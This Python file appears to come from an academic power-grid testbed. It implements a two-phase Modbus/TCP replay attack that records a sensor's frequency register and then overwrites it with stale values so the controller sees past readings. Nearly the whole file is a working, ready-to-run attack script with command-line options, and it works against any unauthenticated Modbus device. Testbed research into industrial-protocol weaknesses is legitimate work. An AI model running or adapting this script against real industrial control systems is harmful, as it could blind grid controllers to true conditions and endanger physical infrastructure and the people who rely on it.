"""
attacks/replay.py — Modbus Stale-Value Replay Attack

Mechanism
---------
Two-phase attack run from the attacker host using only standard Modbus
function codes:

  Phase 1 — Record (read-only):
    A Modbus READ_HOLDING_REGISTERS (FC 3) client polls the sensor's
    frequency register (HR 0) during a configurable window before the
    attack, buffering raw integer values in memory.

  Phase 2 — Attack (write):
    The same client switches to WRITE_SINGLE_REGISTER (FC 6), cycling
    through the buffered stale values in round-robin fashion and writing
    them back to HR 0. The live sensor continues updating the register,
    but the attacker overwrites it at the same or higher rate with the
    recorded history. The controller reads only the replayed past state.

No interception or MITM is required — the attacker simply reads, then
writes, using fully standard protocol operations.

Academic framing (for writeup)
-------------------------------
Both the record and attack phases use only standard Modbus function codes
(FC 3 and FC 6) on an unauthenticated connection. Modbus/TCP carries no
sequence numbers, message timestamps, or freshness tokens, so replayed
historical traffic is indistinguishable from live sensor data at the
protocol level. This directly demonstrates the NISTIR 7628 §2.3 / IEC 62351
documented threat: "replay attacks on field-device polling protocols".

Attack window coordination
--------------------------
ATTACK_ACTIVE is written to the shared SQLite DB during Phase 2 only
(the record phase is passive observation — not an active attack).

Usage:
    python attacks/replay.py \\
        --sensor-ip    192.168.1.10 \\
        --record-start  5  --record-duration 50 \\
        --attack-start 60  --attack-duration 120 \\
        [--db-path powergrid_db.sqlite] \\
        [--scale-factor 100] \\
        [--period 0.1]
"""

import sys
import os
import time
import argparse
import sqlite3

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient

MODBUS_PORT = 502
FREQ_REGISTER = 0


# ──────────────────────────────────────────────────────────────────────────────
# Shared-state helper
# ──────────────────────────────────────────────────────────────────────────────

def _set_attack_flag(db_path: str, value: str) -> None:
    """Write ATTACK_ACTIVE tag to shared SQLite state DB."""
    try:
        conn = sqlite3.connect(db_path, timeout=5)
        conn.execute(
            "UPDATE powergrid SET value=? WHERE name='ATTACK_ACTIVE' AND pid=1",
            (value,)
        )
        conn.commit()
        conn.close()
    except Exception as exc:
        print(f"[replay] WARNING: ATTACK_ACTIVE update failed: {exc}", file=sys.stderr)


# ──────────────────────────────────────────────────────────────────────────────
# Attack logic
# ──────────────────────────────────────────────────────────────────────────────

def run_replay(
    sensor_ip: str,
    record_start: float,
    record_duration: float,
    attack_start: float,
    attack_duration: float,
    db_path: str,
    scale_factor: float,
    period: float,
) -> None:
    """Main entry point: record window → wait → replay window → cleanup."""

    record_end = record_start + record_duration
    attack_end = attack_start + attack_duration

    print(f"[replay] ── Configuration ────────────────────────────────────")
    print(f"[replay]   Target sensor  : {sensor_ip}:{MODBUS_PORT}")
    print(f"[replay]   Record window  : t={record_start:.1f}s → t={record_end:.1f}s")
    print(f"[replay]   Attack window  : t={attack_start:.1f}s → t={attack_end:.1f}s")
    print(f"[replay]   Poll period    : {period:.3f}s")
    print(f"[replay]   State DB       : {db_path}")
    print(f"[replay] ─────────────────────────────────────────────────────")

    t0 = time.monotonic()

    def elapsed() -> float:
        return time.monotonic() - t0

    # ── Wait for record window ───────────────────────────────────────────────
    wait = record_start - elapsed()
    if wait > 0:
        print(f"[replay] Waiting {wait:.1f}s before record window opens...")
        time.sleep(wait)

    # ── Connect ──────────────────────────────────────────────────────────────
    client = ModbusTcpClient(host=sensor_ip, port=MODBUS_PORT)
    if not client.connect():
        print(f"[replay] ERROR: Modbus connection to {sensor_ip}:{MODBUS_PORT} failed.",
              file=sys.stderr)
        sys.exit(1)
    print(f"[replay] Connected to {sensor_ip}:{MODBUS_PORT}. Starting record phase.")

    # ── Phase 1: Record (FC 3 — read-only) ──────────────────────────────────
    buffer = []   # list of raw Modbus integer register values

    while elapsed() < record_end:
        loop_t = time.monotonic()
        try:
            rr = client.read_holding_registers(FREQ_REGISTER, count=1)
            if rr and not (hasattr(rr, 'isError') and rr.isError()):
                val = rr.registers[0]
                buffer.append(val)
        except Exception as exc:
            print(f"[replay] Read exception: {exc}", file=sys.stderr)
        sleep_t = period - (time.monotonic() - loop_t)
        if sleep_t > 0:
            time.sleep(sleep_t)

    sample_hz = [f"{v / scale_factor:.3f}" for v in buffer[:6]]
    print(f"[replay] Record phase complete: {len(buffer)} samples buffered. "
          f"First 6 (Hz): {sample_hz}{'...' if len(buffer) > 6 else ''}")

    if not buffer:
        print("[replay] ERROR: No samples recorded — cannot replay. Exiting.", file=sys.stderr)
        client.close()
        sys.exit(1)

    # ── Wait between record end and attack start ─────────────────────────────
    wait = attack_start - elapsed()
    if wait > 0:
        print(f"[replay] Waiting {wait:.1f}s before attack window opens...")
        time.sleep(wait)

    # ── Phase 2: Attack (FC 6 — write stale values) ──────────────────────────
    _set_attack_flag(db_path, '1')
    print(f"[replay] ATTACK_ACTIVE = True  ← attack window open")
    print(f"[replay] Replaying {len(buffer)} buffered values in round-robin...")

    buf_idx = 0
    writes_ok = 0
    writes_fail = 0
    window_start = time.monotonic()

    try:
        while (time.monotonic() - window_start) < attack_duration:
            loop_t = time.monotonic()
            stale_val = buffer[buf_idx % len(buffer)]
            buf_idx += 1
            try:
                rr = client.write_register(FREQ_REGISTER, stale_val)
                if rr and hasattr(rr, 'isError') and rr.isError():
                    print(f"[replay] write_register error: {rr}")
                    writes_fail += 1
                else:
                    writes_ok += 1
            except Exception as exc:
                writes_fail += 1
                print(f"[replay] Write exception: {exc}", file=sys.stderr)
            sleep_t = period - (time.monotonic() - loop_t)
            if sleep_t > 0:
                time.sleep(sleep_t)

    finally:
        # ── Cleanup ──────────────────────────────────────────────────────────
        client.close()
        _set_attack_flag(db_path, '0')
        print(f"[replay] ATTACK_ACTIVE = False ← attack window closed")
        print(f"[replay] Stats: {writes_ok} OK / {writes_fail} failed writes, "
              f"{buf_idx} total replay iterations")


# ──────────────────────────────────────────────────────────────────────────────
# CLI entrypoint
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Modbus stale-value replay attack — Power Grid CPS Testbed Phase 3',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument('--sensor-ip',
                        default='192.168.1.10',
                        help='Sensor Modbus/TCP server IP')
    parser.add_argument('--record-start',
                        type=float, default=5.0,
                        help='Seconds after launch to begin recording (s)')
    parser.add_argument('--record-duration',
                        type=float, default=50.0,
                        help='Duration of recording window (s)')
    parser.add_argument('--attack-start',
                        type=float, default=60.0,
                        help='Seconds after launch to begin replaying (s)')
    parser.add_argument('--attack-duration',
                        type=float, default=120.0,
                        help='Duration of active replay window (s)')
    parser.add_argument('--db-path',
                        default='powergrid_db.sqlite',
                        help='Path to shared SQLite state database')
    parser.add_argument('--scale-factor',
                        type=float, default=100.0,
                        help='Modbus integer scaling factor')
    parser.add_argument('--period',
                        type=float, default=0.1,
                        help='Poll / write interval (s)')
    args = parser.parse_args()

    run_replay(
        sensor_ip=args.sensor_ip,
        record_start=args.record_start,
        record_duration=args.record_duration,
        attack_start=args.attack_start,
        attack_duration=args.attack_duration,
        db_path=args.db_path,
        scale_factor=args.scale_factor,
        period=args.period,
    )
